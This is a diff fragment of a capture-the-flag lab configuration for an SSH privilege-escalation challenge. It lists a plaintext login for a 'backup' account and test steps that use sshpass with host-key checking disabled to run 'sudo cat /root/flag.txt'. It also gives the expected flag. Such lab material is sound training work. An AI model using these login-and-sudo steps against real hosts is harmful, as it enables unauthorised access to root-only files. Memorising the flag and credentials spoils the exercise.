+      The flag demonstrates that even "read-only" sudo permissions (cat, ls) can lead
+      to complete system compromise through information disclosure and credential theft.
+    unlock_after_minutes: 25
+
+credentials:
+  - username: "backup"
+    password: "Backup2024#"
+    role: "ssh-user"
+    description: "SSH login credentials for backup account"
+
+workbook: "wiki/range/linpt/CH_LIN03_SSH_Post_Exploitation/03_SSH_Privilege_Escalation/"
+
+test:
+  steps:
+    - name: "Verify SSH port is open"
+      command: "nc -z -w 5 {target.target} 22 && echo 'port_open'"
+      expect: "port_open"
+    - name: "SSH banner check"
+      command: "nc -w 5 {target.target} 22 </dev/null | head -1"
+      expect: "SSH"
+    - name: "SSH login and retrieve flag via sudo cat"
+      command: "sshpass -p '{cred.ssh-user.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.ssh-user.user}@{target.target} 'sudo cat /root/flag.txt 2>/dev/null' 2>/dev/null"
+      expect: "OCR{sud0_3sc}"
